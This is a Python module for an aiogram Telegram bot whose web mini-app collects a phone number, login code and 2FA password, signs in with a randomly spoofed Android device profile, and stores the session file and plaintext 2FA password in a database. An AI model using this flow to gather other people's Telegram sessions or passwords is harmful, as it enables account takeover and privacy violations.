from __future__ import annotations

import logging
import secrets
from pathlib import Path

from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from aiogram.fsm.context import FSMContext

from tglol.config import Config
from tglol.desktop_profile import random_android_runtime, utc_now_iso
from tglol.paths import unique_path
from tglol.telegram_service import send_code, sign_in_or_sign_up, sign_in_password, user_fields
from tglol.states import AddByCode

logger = logging.getLogger(__name__)


def webapp_register_button() -> InlineKeyboardMarkup:
    """Кнопка для открытия мини-приложения регистрации"""
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text="📱 Зарегистрировать аккаунт",
                web_app=WebAppInfo(url="https://ваш-домен.com/webapp/index.html")  # <-- СМЕНИ НА СВОЙ URL
            )]
        ]
    )


async def handle_webapp_data(data: str, message: Message, config: Config, state: FSMContext):
    """Обработчик данных из мини-приложения"""
    try:
        import json
        payload = json.loads(data)
        action = payload.get('action')
        phone = payload.get('phone', '').strip()

        logger.info(f"WebApp data: action={action}, phone={phone}")

        if action == 'register_start':
            return await _handle_register_start(message, config, state, phone)

        elif action == 'captcha_done':
            return await _handle_captcha_done(message, config, state, phone)

        elif action == 'submit_code':
            code = payload.get('code', '').strip()
            return await _handle_submit_code(message, config, state, phone, code)

        elif action == 'resend_code':
            return await _handle_resend_code(message, config, state, phone)

        elif action == 'submit_twofa':
            password = payload.get('password', '').strip()
            return await _handle_submit_twofa(message, config, state, phone, password)

        else:
            await message.answer("❌ Неизвестное действие")
            return {'action': 'error', 'message': 'Unknown action'}

    except Exception as e:
        logger.error(f"Error handling webapp data: {e}")
        await message.answer(f"❌ Ошибка: {e}")
        return {'action': 'error', 'message': str(e)}


async def _handle_register_start(message: Message, config: Config, state: FSMContext, phone: str):
    """Начинает процесс регистрации"""
    if not phone or not phone.startswith('+'):
        return {'action': 'error', 'message': 'Некорректный номер'}

    # Сохраняем номер в состояние
    await state.update_data(phone=phone)

    return {'action': 'captcha_required', 'message': 'Требуется пройти капчу в Telegram'}


async def _handle_captcha_done(message: Message, config: Config, state: FSMContext, phone: str):
    """Пользователь сказал, что прошёл капчу — отправляем код"""
    data = await state.get_data()
    if data.get('phone') != phone:
        return {'action': 'error', 'message': 'Номер не совпадает'}

    runtime = random_android_runtime()
    admin_id = message.from_user.id
    login_id = secrets.token_hex(4)
    phone_digits = phone.lstrip('+')
    session_path = unique_path(config.temp_dir, f"temp_session_{admin_id}_{phone_digits}_{login_id}.session")

    try:
        code_request = await send_code(
            session_path,
            phone,
            config.telegram_api_id,
            config.telegram_api_hash,
            runtime,
        )
    except Exception as e:
        logger.error(f"Send code error: {e}")
        return {'action': 'error', 'message': f'Ошибка отправки кода: {e}'}

    await state.update_data(
        phone=phone,
        phone_code_hash=code_request.phone_code_hash,
        session_path=str(session_path),
        login_id=login_id,
        admin_id=admin_id,
        runtime=runtime,
        login_started_at=utc_now_iso(),
    )

    return {'action': 'code_sent', 'message': 'Код отправлен в Telegram'}


async def _handle_submit_code(message: Message, config: Config, state: FSMContext, phone: str, code: str):
    """Подтверждает код"""
    data = await state.get_data()
    if data.get('phone') != phone:
        return {'action': 'error', 'message': 'Номер не совпадает'}

    phone_code_hash = data.get('phone_code_hash')
    if not phone_code_hash:
        return {'action': 'error', 'message': 'Сначала запросите код'}

    try:
        user = await sign_in_or_sign_up(
            Path(data['session_path']),
            phone,
            code,
            phone_code_hash,
            config.telegram_api_id,
            config.telegram_api_hash,
            data['runtime'],
        )
    except Exception as e:
        error_text = str(e)
        if '2FA' in error_text or 'password' in error_text.lower():
            return {'action': 'twofa_required', 'message': 'Требуется пароль 2FA'}
        return {'action': 'error', 'message': f'Ошибка: {e}'}

    # Успешный вход
    account_id = await _save_account(message, config, state, user)
    await state.clear()

    return {
        'action': 'login_success',
        'account_id': account_id,
        'phone': phone,
        'message': 'Аккаунт успешно зарегистрирован!'
    }


async def _handle_resend_code(message: Message, config: Config, state: FSMContext, phone: str):
    """Повторная отправка кода"""
    data = await state.get_data()
    if data.get('phone') != phone:
        return {'action': 'error', 'message': 'Номер не совпадает'}

    try:
        from tglol.telegram_service import resend_code
        await resend_code(
            Path(data['session_path']),
            phone,
            data['phone_code_hash'],
            config.telegram_api_id,
            config.telegram_api_hash,
            data['runtime'],
        )
        return {'action': 'code_sent', 'message': 'Код отправлен повторно'}
    except Exception as e:
        return {'action': 'error', 'message': f'Ошибка: {e}'}


async def _handle_submit_twofa(message: Message, config: Config, state: FSMContext, phone: str, password: str):
    """Подтверждает 2FA"""
    data = await state.get_data()
    if data.get('phone') != phone:
        return {'action': 'error', 'message': 'Номер не совпадает'}

    try:
        user = await sign_in_password(
            Path(data['session_path']),
            password,
            config.telegram_api_id,
            config.telegram_api_hash,
            data['runtime'],
        )
    except Exception as e:
        return {'action': 'error', 'message': f'Ошибка 2FA: {e}'}

    account_id = await _save_account(message, config, state, user, twofa=password)
    await state.clear()

    return {
        'action': 'login_success',
        'account_id': account_id,
        'phone': phone,
        'message': 'Аккаунт успешно зарегистрирован!'
    }


async def _save_account(message: Message, config: Config, state: FSMContext, user, twofa: str | None = None) -> int:
    """Сохраняет аккаунт в базу"""
    data = await state.get_data()
    session_path = data['session_path']
    phone = data['phone']
    login_id = data['login_id']
    runtime = data['runtime']

    from tglol.handlers import _promote_login_session, _finalize_code_login_impl
    from tglol.db import add_account
    from tglol.desktop_profile import generated_account_json
    from tglol.json_utils import write_json
    from tglol.telegram_service import user_fields

    session_path = _promote_login_session(config, Path(session_path), phone, login_id)
    fields = user_fields(user)
    json_path = unique_path(config.json_dir, session_path.with_suffix(".json").name)
    generated = generated_account_json(
        config,
        runtime=runtime,
        twofa=twofa,
        session_file=session_path.name,
        phone=fields["phone"],
        user_id=fields["telegram_user_id"],
        username=fields["username"],
        first_name=fields["first_name"],
        last_name=fields["last_name"],
    )
    write_json(json_path, generated)

    now = utc_now_iso()
    account_id = add_account(
        config,
        {
            "phone": fields["phone"],
            "telegram_user_id": fields["telegram_user_id"],
            "username": fields["username"],
            "first_name": fields["first_name"],
            "last_name": fields["last_name"],
            "session_path": str(session_path),
            "json_original_path": None,
            "json_effective_path": str(json_path),
            "json_source": "generated",
            "twofa_password": twofa,
            "source_type": "webapp",
            "status": "active",
            "created_by": message.from_user.id,
            "created_at": now,
            "updated_at": now,
        },
    )
    return account_id
